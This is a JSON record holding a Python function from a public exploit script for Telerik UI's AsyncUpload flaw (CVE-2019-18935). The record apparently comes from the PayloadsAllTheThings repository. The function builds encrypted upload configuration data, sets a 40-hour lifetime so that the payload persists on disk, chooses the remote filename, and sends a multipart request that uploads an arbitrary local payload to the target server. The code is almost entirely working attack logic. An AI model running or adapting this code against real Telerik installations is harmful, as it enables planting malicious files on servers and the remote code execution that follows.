{
    "code": "def upload():\n\n    # Build rauPostData.\n    object = {\n        'TargetFolder': RAUCipher.addHmac(RAUCipher.encrypt(''), ui_version),\n        'TempTargetFolder': RAUCipher.addHmac(RAUCipher.encrypt(temp_target_folder), ui_version),\n        'MaxFileSize': 0,\n        'TimeToLive': {  # These values seem a bit arbitrary, but when they're all set to 0, the payload disappears shortly after being written to disk.\n            'Ticks': 1440000000000,\n            'Days': 0,\n            'Hours': 40,\n            'Minutes': 0,\n            'Seconds': 0,\n            'Milliseconds': 0,\n            'TotalDays': 1.6666666666666666,\n            'TotalHours': 40,\n            'TotalMinutes': 2400,\n            'TotalSeconds': 144000,\n            'TotalMilliseconds': 144000000\n        },\n        'UseApplicationPoolImpersonation': False\n    }\n    type = 'Telerik.Web.UI.AsyncUploadConfiguration, Telerik.Web.UI, Version=' + ui_version + ', Culture=neutral, PublicKeyToken=121fae78165ba3d4'\n    raupostdata = build_raupostdata(object, type)\n    \n    with open(filename_local, 'rb') as f:\n        payload = f.read()\n    \n    metadata = {\n        'TotalChunks': 1,\n        'ChunkIndex': 0,\n        'TotalFileSize': 1,\n        'UploadID': filename_remote  # Determines remote filename on disk.\n    }\n    \n    # Build multipart form data.\n    files = {\n        'rauPostData': (None, raupostdata),\n        'file': (filename_remote, payload, 'application/octet-stream'),\n        'fileName': (None, filename_remote),\n        'contentType': (None, 'application/octet-stream'),\n        'lastModifiedDate': (None, '1970-01-01T00:00:00.000Z'),\n        'metadata': (None, dumps(metadata))\n    }\n    \n    # Send request.\n    print('[*] Local payload name: ', filename_local, file=stderr)\n    print('[*] Destination folder: ', temp_target_folder, file=stderr)\n    print('[*] Remote payload name:', filename_remote, file=stderr)\n    print(file=stderr)\n    send_request(files)",
    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
    "file": "CVE Exploits/Telerik CVE-2019-18935.py",
    "license": "MIT",
    "language": "python"
}